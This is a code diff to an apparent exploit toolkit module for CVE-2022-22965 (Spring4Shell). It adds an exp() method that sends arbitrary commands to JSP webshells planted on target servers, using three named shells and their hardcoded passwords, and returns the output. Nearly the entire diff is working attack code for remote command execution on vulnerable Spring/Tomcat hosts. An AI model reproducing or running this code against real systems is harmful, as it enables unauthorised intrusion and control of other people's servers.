@@ -2,6 +2,8 @@
 from fileinput import filename
 from time import sleep
 import requests
+import urllib3
+
 from util import RandomUA
 from util import JsonMethod
 class CVE_2022_22965:
@@ -134,8 +136,34 @@ class CVE_2022_22965:
         except Exception as e:
             error = f"[error] {url} 未知错误 {e}"
             return error
-    def exp(self, url, proxies, ProxyStute):
-        pass
+    def exp(self, url, proxies, ProxyStute,cmd):
+        shell1 = url + f"shell.jsp?cmd={cmd}"
+        shell2 = url + f"tomcatwar.jsp?pwd=aabysszg&cmd={cmd}"
+        shell3 = url + f"wbexp.jsp?pwd=13exp&cmd={cmd}"
+        if ProxyStute == 1:
+            proxies = proxies
+        else:
+            proxies = None
+        try:
+            if self.expType == "default":
+                r = requests.get(url=shell1,proxies=proxies)
+            elif self.expType == "aabysszg":
+                r = requests.get(url=shell2,proxies=proxies)
+            elif self.expType == "13EXP":
+                r = requests.get(url=shell3,proxies=proxies)
+            else:
+                return "error exp"
+            resp = r.text.strip("\n")
+            return resp
+        except urllib3.util.ssl_match_hostname.CertificateError:
+            result = "[-] CVE_2022_22965命令执行 请求错误"
+        except urllib3.exceptions.MaxRetryError:
+            result = "[-] CVE_2022_22965命令执行 请求错误"
+        except requests.exceptions.SSLError:
+            result = "[-] CVE_2022_22965命令执行 请求错误"
+        except:
+            result = "[-] CVE_2022_22965命令执行 未知错误"
+        return  result
 if __name__ == "__main__":
     poc = CVE_2022_22965()
     result = poc.poc("http://127.0.0.1:8081",proxies=None,ProxyStute=0)
